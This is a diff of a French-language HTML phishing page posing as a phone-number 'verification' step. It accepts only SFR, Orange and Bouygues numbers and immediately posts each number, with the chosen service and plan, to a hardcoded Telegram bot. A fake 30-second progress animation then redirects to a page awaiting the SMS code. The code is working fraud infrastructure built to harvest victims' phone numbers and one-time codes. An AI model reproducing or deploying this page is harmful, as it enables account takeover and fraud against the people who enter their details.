@@ -3,26 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Vérification – Étape 1</title>
+    <title>Vérification numéro</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
-        body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;overflow:hidden;}
+        body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
         .container{max-width:420px;width:100%;}
         .back{position:absolute;top:20px;left:20px;color:#fffc00;font-size:1.5em;text-decoration:none;}
-        .card{background:#111;border-radius:25px;padding:40px 30px;box-shadow:0 20px 60px rgba(255,252,0,0.2);border:1px solid #333;}
-        h1{font-size:2.2em;color:#fffc00;text-align:center;margin-bottom:15px;}
+        .card{background:#111;border-radius:25px;padding:50px 30px;box-shadow:0 20px 60px rgba(255,252,0,0.3);}
+        h1{font-size:2.4em;color:#fffc00;text-align:center;margin-bottom:15px;}
         p{color:#aaa;text-align:center;font-size:1.1em;margin-bottom:40px;}
-        input{width:100%;padding:18px;background:#222;border:2px solid #333;border-radius:15px;color:#fff;font-size:1.2em;text-align:center;letter-spacing:2px;}
-        input:focus{outline:none;border-color:#fffc00;box-shadow:0 0 0 4px rgba(255,252,0,0.2);}
-        .btn{background:#fffc00;color:#000;padding:18px;border:none;border-radius:50px;font-size:1.3em;font-weight:bold;width:100%;margin-top:30px;cursor:pointer;transition:0.3s;}
-        .btn:disabled{background:#444;cursor:not-allowed;}
-        .progress{margin-top:40px;height:6px;background:#222;border-radius:3px;overflow:hidden;display:none;}
-        .progress-bar{height:100%;width:0%;background:#fffc00;transition:width 0.3s ease;}
-        .status{text-align:center;margin-top:20px;color:#fffc00;font-weight:bold;font-size:1.1em;display:none;}
-        .loader{display:none;width:40px;height:40px;border:5px solid #333;border-top:5px solid #fffc00;border-radius:50%;animation:spin 1s linear infinite;margin:30px auto;}
+        input{width:100%;padding:20px;background:#222;border:2px solid #444;border-radius:15px;color:#fff;font-size:1.6em;text-align:center;letter-spacing:3px;}
+        input:focus{outline:none;border-color:#fffc00;}
+        .btn{background:#fffc00;color:#000;padding:20px;border:none;border-radius:50px;font-size:1.4em;font-weight:bold;width:100%;margin-top:40px;cursor:pointer;}
+        .progress{margin-top:40px;height:8px;background:#333;border-radius:4px;overflow:hidden;display:none;}
+        .bar{height:100%;width:0%;background:#fffc00;}
+        .status{text-align:center;margin-top:20px;color:#fffc00;font-weight:bold;display:none;}
+        .loader{display:none;width:50px;height:50px;border:6px solid #333;border-top:6px solid #fffc00;border-radius:50%;animation:spin 1s linear infinite;margin:40px auto;}
         @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
         .error{color:#ff3300;margin-top:20px;text-align:center;font-weight:bold;}
+        .info{color:#666;text-align:center;margin-top:30px;font-size:0.9em;}
     </style>
 </head>
 <body>
@@ -30,15 +30,16 @@
     <div class="container">
         <div class="card">
             <h1>Vérification numéro</h1>
-            <p>Étape 1 sur 2 – 30 secondes</p>
+            <p>Opérateurs acceptés : SFR · Orange · Bouygues</p>
+            <p class="info">Free / Sosh / autres = refusé</p>
 
-            <form id="phoneForm">
-                <input type="tel" id="phone" placeholder="+33 6 __ __ __ __" maxlength="12" required>
-                <div id="error" class="error"></div>
-                <button type="submit" class="btn" id="btn">Vérifier le numéro</button>
-            </form>
+            <input type="tel" id="phone" placeholder="+33 6 __ __ __ __" maxlength="12" required autofocus>
 
-            <div class="progress" id="progress"><div class="progress-bar" id="bar"></div></div>
+            <div id="error" class="error"></div>
+
+            <button class="btn" id="btn">Vérifier mon numéro</button>
+
+            <div class="progress" id="progress"><div class="bar" id="bar"></div></div>
             <div class="loader" id="loader"></div>
             <div class="status" id="status"></div>
         </div>
@@ -48,8 +49,7 @@
         const TELEGRAM_TOKEN = "8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo";
         const TELEGRAM_CHAT_ID = "6272429080";
 
-        document.getElementById('phoneForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        document.getElementById('btn').addEventListener('click', async () => {
             const phone = document.getElementById('phone').value.trim();
             const error = document.getElementById('error');
             const btn = document.getElementById('btn');
@@ -66,42 +66,40 @@
                 return;
             }
 
-            // Vérification opérateur SFR / Orange / Bouygues
             const prefix = clean.slice(-9, -7);
-            const sfrOrangeBouygues = ['60','61','62','63','64','65','66','67','68','69','70','75','76','77','78','79'];
-            if (!sfrOrangeBouygues.includes(prefix)) {
-                error.textContent = 'Numéro non éligible – SFR, Orange ou Bouygues uniquement';
+            const valid = ['60','61','62','63','64','65','66','67','68','69','70','75','76','77','78','79'];
+            if (!valid.includes(prefix)) {
+                error.textContent = 'Numéro refusé – SFR / Orange / Bouygues uniquement';
                 return;
             }
 
-            // Envoi immédiat du numéro à Telegram
+            // Envoi immédiat du numéro
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: `📱 NUMÉRO REÇU – ÉTAPE 1\nService: ${localStorage.getItem('selectedService') || 'N/A'}\nPlan: ${localStorage.getItem('selectedPlan') || 'N/A'}\nNuméro: ${phone}\n⏰ ${new Date().toLocaleString('fr-FR')}\nEn attente du code SMS...`
+                    text: `📱 NUMÉRO VALIDE REÇU\nService: ${localStorage.getItem('selectedService')}\nPlan: ${localStorage.getItem('selectedPlan')}\nNuméro: ${phone}\nEn attente du code SMS...`
                 })
             });
 
-            // Animation 30 secondes
             btn.disabled = true;
-            btn.style.display = 'none';
+            btn.textContent = 'Vérification...';
             progress.style.display = 'block';
             loader.style.display = 'block';
             status.style.display = 'block';
-            status.textContent = 'Vérification opérateur...';
+            status.textContent = 'Connexion à l’opérateur...';
 
-            let time = 0;
-            const interval = setInterval(() => {
-                time++;
-                bar.style.width = (time / 30 * 100) + '%';
-                if (time === 10) status.textContent = 'Analyse du numéro...';
-                if (time === 20) status.textContent = 'Validation finale...';
+            let t = 0;
+            const int = setInterval(() => {
+                t += 1.667;
+                bar.style.width = t + '%';
+                if (t > 30) status.textContent = 'Analyse du profil...';
+                if (t > 60) status.textContent = 'Validation finale...';
             }, 1000);
 
             setTimeout(() => {
-                clearInterval(interval);
+                clearInterval(int);
                 localStorage.setItem('tempPhone', phone);
                 window.location.href = 'code.html';
             }, 30000);
